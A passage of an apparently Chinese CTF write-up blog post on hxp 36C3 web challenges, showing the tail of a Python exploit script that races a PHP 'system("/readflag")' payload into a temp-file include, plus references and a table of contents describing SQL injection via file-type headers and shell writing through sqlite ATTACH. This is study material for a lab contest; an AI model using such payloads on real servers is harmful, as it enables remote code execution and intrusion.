class="string">"&gt;php(.*)&lt;\/a"</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + tmpname)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        phpcode = <span class="string">'wtf&lt;?php system("/readflag");?&gt;'</span>;</span><br><span class="line">        c.send(phpcode)</span><br><span class="line"></span><br><span class="line">    t = threading.Thread(target = job)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file_get_contents and include tmp file</span></span><br><span class="line">    exp_file = dirname + <span class="string">"/"</span> + tmpname</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span>+exp_file)</span><br><span class="line">    r3 = requests.post(<span class="string">"http://192.168.220.154:5478/"</span>, data=&#123;<span class="string">'file'</span>:exp_file&#125;)</span><br><span class="line">    print(r3.status_code,r3.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"wtf"</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t.join()</span><br><span class="line">    r.close()</span><br><span class="line">    l.close()</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br></pre></td></tr></table></figure>

<h5 id="References"><a href="#References" class="headerlink" title="References"></a>References</h5><h6 id="https-blog-zeddyu-info-2020-01-08-36c3-web"><a href="#https-blog-zeddyu-info-2020-01-08-36c3-web" class="headerlink" title="https://blog.zeddyu.info/2020/01/08/36c3-web/"></a><a href="https://blog.zeddyu.info/2020/01/08/36c3-web/" target="_blank" rel="noopener">https://blog.zeddyu.info/2020/01/08/36c3-web/</a></h6><h6 id="20191228-hxp36c3ctf"><a href="#20191228-hxp36c3ctf" class="headerlink" title="20191228-hxp36c3ctf"></a><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></h6><h6 id="https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"><a href="#https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" class="headerlink" title="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"></a><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></h6><h6 id="https-ctftime-org-task-10211"><a href="#https-ctftime-org-task-10211" class="headerlink" title="https://ctftime.org/task/10211"></a><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/01/06/2019hack-luCTFçš„rpdgçš„ç¯å¢ƒçš„æ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹/" rel="next" title="2019hack.luCTFçš„rpdgçš„ç¯å¢ƒçš„æ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹">
                <i class="fa fa-chevron-left"></i> 2019hack.luCTFçš„rpdgçš„ç¯å¢ƒçš„æ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/01/16/å›¾ç‰‡æœ¨é©¬åˆ¶ä½œå¤§æ³•/" rel="prev" title="å›¾ç‰‡æœ¨é©¬åˆ¶ä½œå¤§æ³•">
                å›¾ç‰‡æœ¨é©¬åˆ¶ä½œå¤§æ³• <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                å‹æƒ…é“¾æ¥
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#å‰è¨€"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-FILE-Magician"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 FILE Magician</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±-new-finfo-gt-fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±(new finfo)-&gt;fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId-è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId()è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress-39-d-dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">ç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress&#39;d dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS-object-39-39-ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">è¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS object&#39;&#39;ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹-payload-å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹ payload å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sqliteæ˜¯å¯ä»¥ç”¨-phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite-attachä¸€ä¸ªz-phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">sqliteæ˜¯å¯ä»¥ç”¨.phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite attachä¸€ä¸ªz.phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™-shell"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™ shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#other-file"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">other file</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„-wp-ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä»-ctftime-ä¸Šå…¬å¼€çš„-wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„ wp ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä» ctftime ä¸Šå…¬å¼€çš„ wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#TeX-DVI-file"><span class="nav-number">1.0.1.15.</span> <span class="nav-text">TeX DVI file</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®"><span class="nav-number">1.0.1.16.</span> <span class="nav-text">0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#jpeg"><span class="nav-number">1.0.1.17.</span> <span class="nav-text">jpeg</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨-jpeg-çš„-EXIF-æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯†-software-çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯†-comment-çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-exiftool-æ¥ä¿®æ”¹å›¾ç‰‡ã€‚"><span class="nav-number">1.0.1.18.</span> <span class="nav-text">åœ¨ jpeg çš„ EXIF æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯† software çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯† comment çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ exiftool æ¥ä¿®æ”¹å›¾ç‰‡ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#null"><span class="nav-number">1.0.1.19.</span> <span class="nav-text">#!</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨-çš„æ–‡ä»¶æ¥æ„é€ payload"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨#!/çš„æ–‡ä»¶æ¥æ„é€ payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#gz"><span class="nav-number">1.0.1.21.</span> <span class="nav-text">gz</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åˆ©ç”¨gunzipç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å"><span class="nav-number">1.0.1.22.</span> <span class="nav-text">åˆ©ç”¨gunzipç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹"><span class="nav-number">1.0.1.23.</span> <span class="nav-text">å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-WriteUpBin"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 WriteUpBin</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag-å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨-admin-ç”¨æˆ·çš„ç¬¬ä¸€æ¡-writeup-æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™-admin-ï¼Œè®©-admin-ç»™ä½ ç‚¹èµã€‚"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨ admin ç”¨æˆ·çš„ç¬¬ä¸€æ¡ writeup æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™ admin ï¼Œè®© admin ç»™ä½ ç‚¹èµã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show-phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show.phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup-idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag-writeup-idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header-phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup-id"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag writeup idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header.phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup id</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ"><span class="nav-number">1.0.2.5.</span> <span class="nav-text">æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š"><span class="nav-number">1.0.2.6.</span> <span class="nav-text">æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨find-element-by-xpathæ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚"><span class="nav-number">1.0.2.7.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨find_element_by_xpathæ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general-phpä¸­çš„é˜²å¾¡æªæ–½"><span class="nav-number">1.0.2.8.</span> <span class="nav-text">æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general.phpä¸­çš„é˜²å¾¡æªæ–½</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 